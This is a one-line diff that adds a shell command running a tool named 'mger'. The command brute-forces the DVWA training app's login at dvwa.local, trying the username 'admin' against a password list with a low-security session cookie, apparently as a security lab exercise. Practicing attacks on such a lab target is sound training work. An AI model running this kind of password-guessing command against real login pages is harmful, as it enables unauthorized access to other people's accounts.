@@ -1,0 +1,1 @@
+./mger admin passwords.txt dvwa.local "/vulnerabilities/brute/index.php?username=%s&password=%s&Login=Login" "security=low; security=low; PHPSESSID=p49fqombtrtcs1d0akka0mcba3"
